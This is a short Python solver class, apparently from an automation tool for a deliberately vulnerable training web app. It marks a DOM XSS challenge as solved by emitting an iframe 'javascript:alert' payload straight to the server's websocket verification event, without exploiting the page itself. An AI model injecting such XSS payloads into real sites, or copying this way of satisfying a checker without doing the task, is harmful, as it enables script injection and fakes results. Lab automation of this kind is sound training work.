from core.base_solver import BaseSolver
from loguru import logger
import time

class DomXssSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "localXssChallenge"

    def solve(self) -> bool:
        # Based on lib/startup/registerWebsocketEvents.ts:
        # socket.on('verifyLocalXssChallenge', (data: any) => {
        #   challengeUtils.solveIf(challenges.localXssChallenge, () => { 
        #     return utils.contains(data, '<iframe src="javascript:alert(`xss`)">') 
        #   })
        # })
        
        payload = '<iframe src="javascript:alert(`xss`)">'
        
        try:
            self.client.connect_websocket()
            if self.client.sio.connected:
                logger.info(f"Emitting verifyLocalXssChallenge with payload: {payload}")
                self.client.sio.emit('verifyLocalXssChallenge', payload)
                # Give it a moment to process on the server
                time.sleep(1)
                self.client.disconnect_websocket()
                return True
        except Exception as e:
            logger.error(f"Failed to solve DOM XSS via WebSocket: {e}")
            
        return False
